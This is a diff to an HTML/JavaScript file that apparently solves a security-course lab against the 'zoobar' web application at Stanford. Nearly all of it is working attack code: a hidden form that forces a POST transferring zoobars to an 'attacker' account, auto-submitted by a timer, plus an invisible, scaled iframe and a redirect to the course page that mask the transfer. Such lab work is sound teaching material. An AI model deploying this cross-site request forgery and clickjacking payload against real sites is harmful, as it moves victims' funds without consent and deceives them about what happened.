@@ -26,10 +26,25 @@
 		
 		<script type="text/javascript">
 		//<![CDATA[
-			var egg = "<iframe onload='if (typeof(document.numLoads) == \"undefined\"){ document.numLoads = 0; } document.numLoads += 1; if (document.numLoads > 2){ parent.location = \"http://crypto.stanford.edu/cs155/\" }' id='innerFrame' name='innerFrame' style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; transform: scale(27, 49) translate(130px, 766px);'></iframe>" +
-				"<form id='transferForm' style='display:none' action='http://zoobar.stanford.edu/transferC.php' method='POST' target='innerFrame'>" +
-				"<input type='text' name='zoobars' value='10'>" +
-				"<input type='text' name='recipient' value='alamo_attacker'>" +
+			var hostname = "zoobar.stanford.edu";
+			var action = "http://" + hostname + "/transferC.php"
+			var zoobars = "10";
+			var attacker_name = "attacker";
+			var timeout = 100;
+			var CSS_ZOOM_TRANSFORM_UBUNTU = "transform: scale(26, 36) translate(100px, 720px);";
+			var CSS_ZOOM_TRANSFORM_OSX = "transform: scale(27, 49) translate(130px, 766px);";
+			var css_zoom_transform = CSS_ZOOM_TRANSFORM_UBUNTU;
+
+			var egg = "<iframe id='innerFrame' name='innerFrame' " + 
+				"style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0; " + css_zoom_transform + "' " +
+				"onload='" + 
+					"if (typeof(document.numLoads) == \"undefined\"){ document.numLoads = 0; } " + 
+					"document.numLoads += 1; " +
+					"if (document.numLoads > 2){ parent.location = \"http://crypto.stanford.edu/cs155/\" }'>" + 
+				"</iframe>" +
+				"<form id='transferForm' style='display:none' action='" + action + "' method='POST' target='innerFrame'>" +
+				"<input type='text' name='zoobars' value='" + zoobars + "'>" +
+				"<input type='text' name='recipient' value='" + attacker_name + "'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
 
@@ -61,7 +76,7 @@
 			var transferForm = outerFrameDoc.body.children['transferForm'];
 			//transferForm.submit();
 			
-			setTimeout( function(){ transferForm.submit(); }, 100 );
+			setTimeout( function(){ transferForm.submit(); }, timeout );
 
 
 			//setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
